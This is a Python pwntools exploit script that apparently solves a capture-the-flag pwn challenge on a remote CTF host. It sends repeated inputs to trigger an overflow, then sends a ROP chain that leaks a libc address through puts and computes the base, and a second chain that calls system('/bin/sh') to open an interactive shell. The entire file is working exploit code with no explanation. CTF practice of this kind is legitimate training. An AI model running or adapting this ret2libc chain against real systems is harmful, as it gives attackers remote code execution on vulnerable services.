from pwn import *
from time import sleep

pop_rdi=0x000000000040155b
ret=0x000000000040110f
puts_plt=0x0000000000401040
entry=0x4010b0
libc_start_main_got=0x0000000000403ff0
#context.log_level="error"
for i in range(300):
    print i
    #p=process("./pwn2")
    p=remote("79gq4l5zpv1aogjgw6yhhymi4.ctf.p0wnhub.com",21337)
    p.sendline("smsg")
    for j in range(80):
        print j
        p.sendline("A")
        sleep(0.1)
        p.sendline("N")
    payload=""
    payload+=p64(ret)
    payload+=p64(ret)
    payload+=p64(ret)
    payload+=p64(pop_rdi)
    payload+=p64(libc_start_main_got)
    payload+=p64(puts_plt)
    payload+=p64(entry)
    p.sendline(payload)
    sleep(2)
    p.sendline("Y")
    print p.recvuntil("Sent.",timeout=2)

    data=p.recv()
    if "\x7f" in data:
        print "FOUND"
        print data
        data=data.strip()[:-1].strip()
        for i in data:
            print hex(ord(i))
        leak=u64(data.ljust(8,"\x00"))
        base=leak-0x021ab0
        system=base+0x04f440
        binsh=base+0x1b3e9a
        print "leak :",hex(leak)
        print "base :",hex(base)
        print "system :",hex(system)
        print "binsh :",hex(binsh)

        p.sendline("smsg")

        for j in range(80):
            print j
            p.sendline("A")
            sleep(0.1)
            p.sendline("N")

        payload=""
        payload+=p64(ret)
        payload+=p64(ret)
        payload+=p64(pop_rdi)
        payload+=p64(binsh)
        payload+=p64(system)
        payload+=p64(entry)
        p.sendline(payload)
        sleep(2)
        p.sendline("Y")
        p.recvuntil("Sent",timeout=5)
        try:
            p.sendline("id")
            p.sendline("")
            p.interactive()
        except:
            c=0
        break

    p.close()
